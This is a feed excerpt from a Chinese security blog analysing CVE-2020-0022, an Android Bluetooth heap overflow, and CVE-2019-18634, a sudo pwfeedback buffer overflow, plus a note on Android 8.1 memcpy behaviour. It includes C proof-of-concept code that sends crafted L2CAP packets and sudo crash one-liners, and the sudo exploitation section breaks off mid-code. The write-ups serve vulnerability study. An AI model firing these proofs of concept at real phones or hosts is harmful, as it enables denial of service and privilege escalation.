href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161429.png" title="image-20200214174315466" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161429.png" alt="image-20200214174315466"></a></p><p>如果 projected_offset  大于 partial_packet-&gt;len 则进行一次减法运算：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161434.png" title="image-20200214174406350" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161434.png" alt="image-20200214174406350"></a></p><p> packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</p><p> projected_offset = partial_packet-&gt;len;</p><p>重新设置  packet-&gt;len 与 projected_offset，packet-&gt;len为partial_packet剩余空间的长度。然后，将projected_offset设置为partial_packet-&gt;len</p><p>如果此时 <code>packet-&gt;len</code> 的结果是一个小的数，那么在</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161439.png" title="image-20200214174600143" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161439.png" alt="image-20200214174600143"></a></p><p>228 行进行拷贝的时候，packet-&gt;len - packet-&gt;offset 就可能为一个负数，当size 为负数，由于memcpy 的参数是无符号的，所以会被强制转换为一个大数，然后造成堆溢出。</p><h2 id="PoC-构建"><a href="#PoC-构建" class="headerlink" title="PoC 构建"></a>PoC 构建</h2><p>PoC 链接可以看着： <a href="https://gist.github.com/leommxj/c9ba42e54faa9629cff5db3b4daeccef">https://gist.github.com/leommxj/c9ba42e54faa9629cff5db3b4daeccef</a></p><ol><li>我们要构建  packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset; 为一个小数，或者干脆就是一个负数</li></ol><p>通过前文分析，我们知道 packet-&gt;len  等于 partial_packet-&gt;len - partial_packet-&gt;offset 相减，partial_packet-&gt;len 为 full_length  -&gt; </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">full_length =</span><br><span class="line">          l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>partial_packet-&gt;offset  为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">partial_packet-&gt;offset = packet-&gt;len;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nCreating a HCI BLE connection...\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nPrepare to send packet\n&quot;</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> datalen = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> _bs_l2cap_len = htobs(datalen + <span class="number">4</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> _bs_cid = htobs(<span class="number">0x0001</span>);</span><br><span class="line"><span class="keyword">uint8_t</span> packet[<span class="number">4</span> + L2CAP_CMD_HDR_SIZE + datalen + <span class="number">11</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;packet[<span class="number">0</span>],&amp;_bs_l2cap_len,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;packet[<span class="number">2</span>],&amp;_bs_cid,<span class="number">2</span>);</span><br><span class="line">l2cap_cmd_hdr* cmd = (l2cap_cmd_hdr*) (packet+ <span class="number">4</span>);</span><br><span class="line">cmd-&gt;code = L2CAP_ECHO_REQ;</span><br><span class="line">cmd-&gt;ident = <span class="number">0x01</span>;</span><br><span class="line">cmd-&gt;len = htobs(datalen);</span><br><span class="line"><span class="built_in">memset</span>(&amp;packet[<span class="number">8</span>], <span class="number">0x99</span>, datalen+<span class="number">11</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending first packet\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> i =<span class="number">0</span> ;</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">8</span> + <span class="number">4</span> ,<span class="number">0x0</span>, <span class="number">8</span> + <span class="number">4</span> ); </span><br><span class="line">i+=<span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending second packet\n&quot;</span>);</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">12</span>,<span class="number">0x1</span>,<span class="number">12</span>);</span><br><span class="line">i+=<span class="number">12</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending third packet\n&quot;</span>);</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">12</span>,<span class="number">0x1</span>,<span class="number">12</span>); </span><br><span class="line">i+=<span class="number">12</span>;</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">11</span>,<span class="number">0x1</span>,<span class="number">11</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nClosing HCI socket...\n&quot;</span>);</span><br><span class="line">close(hci_socket);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nClosing l2cap socket...\n&quot;</span>);</span><br><span class="line">close(l2_sock);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先，整个l2cap 长度为 ： datalen + header 即 30 + 4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">full_length =</span><br><span class="line">          l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>那么此时 full_length 就等于  34 + 4 + 4 等于 42</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">packet-&gt;offset &#x3D; HCI_ACL_PREAMBLE_SIZE;</span><br><span class="line">uint16_t projected_offset &#x3D;</span><br><span class="line">    partial_packet-&gt;offset + (packet-&gt;len - HCI_ACL_PREAMBLE_SIZE);</span><br><span class="line">if (projected_offset &gt;</span><br><span class="line">    partial_packet-&gt;len) &#123;  &#x2F;&#x2F; len stores the expected length</span><br><span class="line">  LOG_WARN(LOG_TAG,</span><br><span class="line">           &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">           &quot;Truncating.&quot;,</span><br><span class="line">           __func__, partial_packet-&gt;len);</span><br><span class="line">  packet-&gt;len &#x3D; partial_packet-&gt;len - partial_packet-&gt;offset;</span><br><span class="line">  projected_offset &#x3D; partial_packet-&gt;len;</span><br></pre></td></tr></table></figure><p>此时 projected_offset = 36 + （11 - 4）</p><p>36 是由 12 + 12 + 12 当最后一个包的时候 partial_packet-&gt;offset 就为 36</p><p>那么此时 projected_offset = 43</p><p>当 42-43 的时候为负数 则  packet-&gt;len 等于 -1</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/MgttHkorVd5UrW1Cnlc5Xw">https://mp.weixin.qq.com/s/MgttHkorVd5UrW1Cnlc5Xw</a></p><p><a href="https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf^!/">https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf%5E%21/</a></p><p> <a href="https://stackoverflow.com/questions/60116790/sending-gap-acl-l2cap-data-packets">https://stackoverflow.com/questions/60116790/sending-gap-acl-l2cap-data-packets</a></p><p><a href="https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/">https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-0022" scheme="https://bestwing.me/tags/CVE-2020-0022/"/>
    
  </entry>
  
  <entry>
    <title>Android 8.1 上 memcpy 一点有趣的东西</title>
    <link href="https://bestwing.me/Android-8.1-memcpy-func.html"/>
    <id>https://bestwing.me/Android-8.1-memcpy-func.html</id>
    <published>2020-02-15T16:00:00.000Z</published>
    <updated>2020-06-22T17:58:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天一直在看 CVE-2020-0022 的东西，不清楚的同学可以参考：</p><p><a href="https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/">https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/</a></p><p>代码不长，具体逻辑我就不在这里分析了，总而言之问题就是</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/hci/src/packet_fragmenter.cc b/hci/src/packet_fragmenter.cc</span><br><span class="line">index 5036ed5..143fc23 100644</span><br><span class="line"><span class="comment">--- a/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="comment">+++ b/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="meta">@@ -221,7 +221,8 @@</span></span><br><span class="line">                  &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">                  &quot;Truncating.&quot;,</span><br><span class="line">                  __func__, partial_packet-&gt;len);</span><br><span class="line"><span class="deletion">-        packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</span></span><br><span class="line"><span class="addition">+        packet-&gt;len =</span></span><br><span class="line"><span class="addition">+            (partial_packet-&gt;len - partial_packet-&gt;offset) + packet-&gt;offset;</span></span><br><span class="line">         projected_offset = partial_packet-&gt;len;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>当计算 packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset; 值的时候，可能计算出一个小的数，或者干脆是负数，导致在</p><p><a href="https://user-images.githubusercontent.com/18380453/74593171-84e7f580-5063-11ea-8f65-b8d314131260.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593171-84e7f580-5063-11ea-8f65-b8d314131260.png" alt="image"></a></p><p>后面拷贝的时候， 拷贝一个 负数长度的值，由于 memcpy 参数是无符号的，则导致拷贝一个大数</p><h2 id="Android-8-1-memcpy-引起的一个小bug"><a href="#Android-8-1-memcpy-引起的一个小bug" class="headerlink" title="Android 8.1 memcpy 引起的一个小bug"></a>Android 8.1 memcpy 引起的一个小bug</h2><p>在我和 @<a href="https://github.com/leommxj">leommxj</a> 测试的过程中，遇到一个坑，大致如图：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200216022738.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200216022738.png"></a></p><p>X0 是 dest ，X1是 src， X2是 size ，此时的size 明明是个负数，而且下溢后至少是一个很大的数，但是程序并没有崩溃。</p><h3 id="引起-BUG-的原因"><a href="#引起-BUG-的原因" class="headerlink" title="引起 BUG 的原因"></a>引起 BUG 的原因</h3><p>真的各种猜测不如看代码，所以我们把 libc.so 拿出来看了一下</p><a href="https://user-images.githubusercontent.com/18380453/74593437-49025f80-5066-11ea-89f0-ae9d78ba123f.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593437-49025f80-5066-11ea-89f0-ae9d78ba123f.png" alt="image" style="zoom:150%;" /></a><p>重点在于：</p><p><a href="https://user-images.githubusercontent.com/18380453/74593316-e5c3fd80-5064-11ea-9566-ab65710283b0.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593316-e5c3fd80-5064-11ea-9566-ab65710283b0.png" alt="image"></a></p><p>此时 X0 是dest，Dest 取低位赋值给X9，然后 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD X2, X2 ,X9</span><br></pre></td></tr></table></figure><p>而此时的 X2 是 len，导致他整型上溢出，变成一个小的数字，例如 0xa</p><p><a href="https://user-images.githubusercontent.com/18380453/74593356-405d5980-5065-11ea-9ba9-f3b43e68bf9c.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593356-405d5980-5065-11ea-9ba9-f3b43e68bf9c.png" alt="image"></a></p><p>当进入下图逻辑时</p><a href="https://user-images.githubusercontent.com/18380453/74593369-6682f980-5065-11ea-9271-c425599f69f4.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593369-6682f980-5065-11ea-9271-c425599f69f4.png" alt="image" style="zoom:50%;" /></a><p>此时 X2 为 0xA，进行下面的指令的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUBS            X2, X2, #0x90</span><br><span class="line">B.LS            loc_1C8A8</span><br></pre></td></tr></table></figure><p>由于此时 X2 为 0xA ，小于0x40，所以 此时条件为 小于</p><p><strong>B. LS</strong> 则表示，当小于等于条件成立时候，为真，则跳转到  loc_1C8A8 处代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">loc_1C8A8</span><br><span class="line">LDP             X1, X2, [X4,#-0x40]</span><br><span class="line">STP             X6, X7, [X3,#0x10]</span><br><span class="line">LDP             X6, X7, [X4,#-0x30]</span><br><span class="line">STP             X8, X9, [X3,#0x20]</span><br><span class="line">LDP             X8, X9, [X4,#-0x20]</span><br><span class="line">STP             X10, X11, [X3,#0x30]</span><br><span class="line">LDP             X10, X11, [X4,#-0x10]</span><br><span class="line">STP             X12, X13, [X3,#0x40]</span><br><span class="line">STP             X1, X2, [X5,#-0x40]</span><br><span class="line">STP             X6, X7, [X5,#-0x30]</span><br><span class="line">STP             X8, X9, [X5,#-0x20]</span><br><span class="line">STP             X10, X11, [X5,#-0x10]</span><br><span class="line">RET</span><br><span class="line">; &#125; &#x2F;&#x2F; starts at 1C770</span><br></pre></td></tr></table></figure><p>之后的代码逻辑直接就是 RET ，导致 并没有拷贝过长的内存，导致 crash。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android8.1" scheme="https://bestwing.me/tags/Android8-1/"/>
    
    <category term="memcpy" scheme="https://bestwing.me/tags/memcpy/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-18634 分析</title>
    <link href="https://bestwing.me/CVE-2019-18634-analysis.html"/>
    <id>https://bestwing.me/CVE-2019-18634-analysis.html</id>
    <published>2020-02-06T16:00:00.000Z</published>
    <updated>2020-06-22T18:00:43.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>Sudo’s <em>pwfeedback</em> option can be used to provide visual feedback when the user is inputting their password. For each key press, an asterisk is printed. This option was added in response to user confusion over how the standard <code>Password:</code> prompt disables the echoing of key presses. While <em>pwfeedback</em> is not enabled by default in the upstream version of sudo, some systems, such as Linux Mint and Elementary OS, do enable it in their default sudoers files.</p><p>Due to a bug, when the <em>pwfeedback</em> option is enabled in the sudoers file, a user may be able to trigger a stack-based buffer overflow. This bug can be triggered even by users not listed in the sudoers file. There is <strong>no</strong> impact unless <em>pwfeedback</em> has been enabled.</p></blockquote><p>可以知道的信息是：</p><ol><li>漏洞存在的情形时在开启 <strong>pwfeedback</strong> 的前提下</li></ol><p>开启方法 <code>echo Defaults pwfeedback &gt;&gt; /etc/sudoers</code><br>2. 影响版本  1.8.26-1.8.30<br>3. CVE 上写的 stack-based buffer overflow 是有误的，我们后面会提到</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>在 openwall 和 sudo 官网上都能看到连接在下面</p><p><a href="https://www.openwall.com/lists/oss-security/2020/02/05/2">CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled</a></p><p><a href="https://www.sudo.ws/alerts/pwfeedback.html">Buffer overflow when pwfeedback is set in sudoers </a></p><p><strong>PoC 1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ socat pty,link&#x3D;&#x2F;tmp&#x2F;pty,waitslave exec:&quot;perl -e &#39;print((\&quot;A\&quot; x 100 . chr(0x15)) x 50)&#39;&quot; &amp;</span><br><span class="line"> $ sudo -S -k id &lt; &#x2F;tmp&#x2F;pty</span><br><span class="line"> Password: Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p><strong>PoC2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &#39;print((&quot;A&quot; x 100 . chr(0)) x 50)&#39; | sudo -S -k id</span><br><span class="line">Password: Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>PoC1 是通过 pty 程序传 payload  ，PoC2 是通过终端，另外可以看到 一个结尾为 <code>chr(0x15)</code> 一个结尾是 <code>chr(0)</code>, 这是根据不同的传入方式区分的。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h3><p>我的环境是 ubuntu18.04 然后我编译了一份 sudo 1.8.21p2 的源码，方便用来调试</p><p>为了方便，我一开始用的是 PoC2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/sudo/sudo-1.8.21p2/src/.libs$ gdb -q ./sudo</span><br><span class="line">Reading symbols from ./sudo...done.</span><br><span class="line">gdb-peda$ r -S id &lt; /tmp/poc2</span><br><span class="line">Starting program: /home/swing/Desktop/sudo/sudo-1.8.21p2/src/.libs/sudo -S id &lt; /tmp/poc2</span><br><span class="line">sudo: effective uid is not 0, is /home/swing/Desktop/sudo/sudo-1.8.21p2/src/.libs/sudo on a file system with the <span class="string">&#x27;nosuid&#x27;</span> option <span class="built_in">set</span> or an NFS file system without root privileges?</span><br><span class="line">[Inferior 1 (process 14799) exited with code 01]</span><br></pre></td></tr></table></figure><p>第一次挂载 gdb 的时候会发现 权限不够，但是如果权限是 root sudo又失去了意义，所以我给 gdb 挂上了和 sudo 一样的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown root:root /usr/bin/gdb &amp;&amp; chmod 4755 /usr/bin/gdb</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png"></a></p><p>然后在调试，就基本确定了主要漏洞的存在，在 tgetpass.c:178 getln函数里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (timeout &gt; <span class="number">0</span>)</span><br><span class="line">alarm(timeout);</span><br><span class="line">   pass = getln(input, buf, <span class="keyword">sizeof</span>(buf), ISSET(flags, TGP_MASK));</span><br><span class="line">   alarm(<span class="number">0</span>);</span><br><span class="line">   save_errno = errno;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (neednl || pass == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (write(output, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">goto</span> restore;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>而且, 由于 buf 是static const 位于bss上，所以并不是 什么栈溢出，而是 bss 溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *</span><br><span class="line">tgetpass(<span class="keyword">const</span> <span class="keyword">char</span> *prompt, <span class="keyword">int</span> timeout, <span class="keyword">int</span> flags,</span><br><span class="line">    struct sudo_conv_callback *callback)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savealrm</span>, <span class="title">saveint</span>, <span class="title">savehup</span>, <span class="title">savequit</span>, <span class="title">saveterm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">savetstp</span>, <span class="title">savettin</span>, <span class="title">savettou</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *pass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *askpass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> i, input, output, save_errno, neednl = <span class="number">0</span>, need_restart;</span><br><span class="line">    debug_decl(tgetpass, SUDO_DEBUG_CONV)</span><br></pre></td></tr></table></figure><p>这个时候，如果我们用 ida 看，能看到他总共覆盖了哪些变量</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png" style="zoom:50%;" /></a><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们找到了一些能覆盖的内容，那么我紧接着要找到哪些是可利用的, 中间 user_details 这个结构体的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p user_details</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  pid &#x3D; 0x41414141,</span><br><span class="line">  ppid &#x3D; 0x41414141,</span><br><span class="line">  pgid &#x3D; 0x41414141,</span><br><span class="line">  tcpgid &#x3D; 0x41414141,</span><br><span class="line">  sid &#x3D; 0x41414141,</span><br><span class="line">  uid &#x3D; 0x41414141,</span><br><span class="line">  euid &#x3D; 0x41414141,</span><br><span class="line">  gid &#x3D; 0x41414141,</span><br><span class="line">  egid &#x3D; 0x41414141,</span><br><span class="line">  username &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  cwd &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  tty &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  host &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  shell &#x3D; 0x4141414141414141 &lt;error: Cannot access memory at address 0x4141414141414141&gt;,</span><br><span class="line">  groups &#x3D; 0x4141414141414141,</span><br><span class="line">  ngroups &#x3D; 0x41414141,</span><br><span class="line">  ts_cols &#x3D; 0x41414141,</span><br><span class="line">  ts_lines &#x3D; 0x41414141</span><br><span class="line">&#125;</span><br><span class="line">gdb</span><br></pre></td></tr></table></figure><p>这个时候，我们就会想如果我们把 uid 覆盖成0 会怎么样？另外在看代码的过程中一段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tgetpass.c 276</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Fork a child and exec sudo-askpass to get the password from the user.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *</span><br><span class="line">sudo_askpass(<span class="keyword">const</span> <span class="keyword">char</span> *askpass, <span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>], *pass;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savechld</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pfd[<span class="number">2</span>], status;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    debug_decl(sudo_askpass, SUDO_DEBUG_CONV)</span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line">closefrom(STDERR_FILENO + <span class="number">1</span>);</span><br><span class="line">execl(askpass, askpass, prompt, (<span class="keyword">char</span> *)<span class="literal">NULL</span>);</span><br><span class="line">sudo_warn(U_(<span class="string">&quot;unable to run %s&quot;</span>), askpass);</span><br><span class="line">_exit(<span class="number">255</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里 execl 的参数 askpass 是前面被覆盖的变量之一，感觉后面会用到。然后在调试的过程中，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tgetpass.c 211</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NSIG; i++) 